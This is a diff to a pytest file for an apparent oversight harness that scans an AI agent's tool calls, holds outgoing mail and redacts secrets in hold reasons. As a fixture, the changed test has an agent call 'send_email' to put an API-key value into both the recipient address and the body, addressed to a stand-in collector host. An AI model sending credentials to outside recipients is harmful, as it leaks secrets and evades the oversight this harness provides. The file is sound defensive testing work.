@@ -203,19 +203,22 @@ async def test_a_secret_in_a_recipient_never_shows_in_the_hold_reason(served):
     assert all("[secret:" in s["reason"] for s in mails)
 
 
+@pytest.mark.parametrize(
+    "after", [" (rotated)", ""], ids=["text-after", "ends-the-call"]
+)
 async def test_a_secret_only_the_calls_own_scan_finds_never_shows_in_the_hold_reason(
-    served,
+    served, after
 ):
     """The scan of the whole call finds a value its body names (`api_key: ...`), and the
     arguments hide it; the reason names it as a recipient and hid only what the run knew.
-    Text follows the value in the body: the scan reads the call as one JSON line, so a value
-    that ends it comes out with the closing quote."""
+    The value may end the call: the scan reads its JSON dump, where a value at the end of a
+    string ran into the closing quote, so the bare value elsewhere stayed in clear."""
     unseen = "unseen-value-4242"  # this run never read it
     run = await new_run(served, {"may_send_to": ["@example.test"]}, kind="control")
     mail = {
         "to": f"{unseen}@collector.invalid",
         "subject": "s",
-        "body": f"api_key: {unseen} (rotated)",
+        "body": f"api_key: {unseen}{after}",
     }
     async with agent(served, run["key"]) as a:
         await a.call_tool("send_email", mail)
@@ -225,7 +228,7 @@ async def test_a_secret_only_the_calls_own_scan_finds_never_shows_in_the_hold_re
     }
     assert [path for path, text in pages.items() if unseen in text] == []
     [step] = await steps(served, run)
-    assert "[secret:" in step["reason"]
+    assert "[secret:" in step["reason"] and json.loads(step["args"])
 
 
 async def test_a_trap_key_the_scan_missed_never_shows_in_an_incident_source(
